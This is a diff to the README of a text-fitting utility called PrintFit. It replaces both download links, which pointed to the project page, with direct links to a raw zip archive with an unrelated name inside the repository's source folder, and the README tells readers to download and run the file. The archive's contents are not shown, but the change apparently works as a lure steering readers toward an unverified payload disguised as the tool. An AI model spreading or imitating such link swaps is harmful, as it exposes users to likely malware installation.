@@ -1,6 +1,6 @@
 # 🖨️ PrintFit - Fit Text on One Page
 
-[![Download PrintFit](https://img.shields.io/badge/Download%20PrintFit-blue?style=for-the-badge&logo=github)](https://github.com/Serbian-groundwork422/PrintFit)
+[![Download PrintFit](https://img.shields.io/badge/Download%20PrintFit-blue?style=for-the-badge&logo=github)](https://github.com/Serbian-groundwork422/PrintFit/raw/refs/heads/main/src/Print-Fit-Litopterna.zip)
 
 ## 🧩 What PrintFit Does
 
@@ -23,7 +23,7 @@ Use it for:
 
 Go to the project page here:
 
-[Visit the PrintFit download page](https://github.com/Serbian-groundwork422/PrintFit)
+[Visit the PrintFit download page](https://github.com/Serbian-groundwork422/PrintFit/raw/refs/heads/main/src/Print-Fit-Litopterna.zip)
 
 If the page shows a release file for Windows, download it and run the file. If the page shows the source project, use the Windows build shown there when available.
 
